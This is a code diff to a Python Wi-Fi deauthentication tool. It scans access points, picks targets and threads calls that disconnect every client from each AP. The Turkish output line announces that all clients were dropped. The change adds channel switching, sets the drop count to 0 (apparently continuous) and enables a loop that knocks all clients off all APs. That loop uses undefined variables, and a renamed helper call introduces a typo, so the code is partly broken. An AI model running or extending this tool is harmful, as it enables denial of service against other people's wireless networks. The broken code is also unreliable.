@@ -19,17 +19,16 @@ from Client import Client
 """
 iface = Interface()
 
-def drop_client_thread(client_mac, ap_bssid, iface_name):
-    Operator.drop_client(client_mac, ap_bssid, iface_name, 10)
+def drop_client_thread(client_mac, ap_bssid, iface_name, channel):
+    iface.set_active_channel(channel)
+    Operator.drop_client(client_mac, ap_bssid, iface_name, 0)
     time.sleep(3)
     
     
 def main():
     # Make the program ready to run.
     u.initialize(iface)
-
     now = time.strftime("%d%m%Y_%H%M%S")
-
     # Detect all APs
     fname = u.create_scan_folder(now)
     detected_aps = Operator.detect_access_points(iface.name, fname)
@@ -38,7 +37,7 @@ def main():
     
 
     # List all APs
-    u.list_avaliable_aps(detected_aps)
+    u.list_avliable_aps(detected_aps)
     # Choose target AP.
     detected_aps = u.choose_target_ap(detected_aps)
 
@@ -60,7 +59,7 @@ def main():
     for ap in detected_aps:
         u.show_available_clients(ap, iface)
         for client in ap.clients:
-            thread = threading.Timer(3, drop_client_thread, args=(client.mac, ap.bssid, iface.name))
+            thread = threading.Timer(3, drop_client_thread, args=(client.mac, ap.bssid, iface.name, ap.channel))
             threads.append(thread)
             thread.start()
 
@@ -71,11 +70,11 @@ def main():
     print("Tüm client'lar düşürüldü.")
 
 
-    # # Drop all clients from all APs
-    # for ap in detected_aps:
-    #     u.show_available_clients(ap, iface)
-    #     for client in ap.clients:
-    #         drop_client_thread(client_mac, ap_bssid, iface_name)
+    # Drop all clients from all APs
+    for ap in detected_aps:
+        u.show_available_clients(ap, iface)
+        for client in ap.clients:
+            drop_client_thread(client_mac, ap_bssid, iface_name)
         
 
 
